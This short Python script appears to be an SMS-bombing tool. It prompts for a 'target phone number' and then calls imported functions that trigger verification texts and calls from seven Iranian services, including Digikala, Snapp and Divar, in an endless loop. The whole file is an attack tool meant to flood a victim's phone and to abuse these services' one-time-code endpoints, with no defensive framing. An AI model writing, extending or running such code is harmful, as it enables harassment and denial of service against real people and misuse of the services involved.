from cafebazar_api import cafebazar_sms
from digikala_api import digikala_sms
from divar_api import divar_sms
from sheypoor_api import sheypoor_sms
from snapp_api import snapp_sms
from tapsi_api import tapsi_sms_call
from poonisha_api import poonisha_sms

phone = input("Enter target phone number: (example : 9XXXXXXXXXXX) ")

while True:
    cafebazar_sms(phone)
    digikala_sms(phone)
    divar_sms(phone)
    sheypoor_sms(phone)
    snapp_sms(phone)
    tapsi_sms_call(phone)
    poonisha_sms(phone)
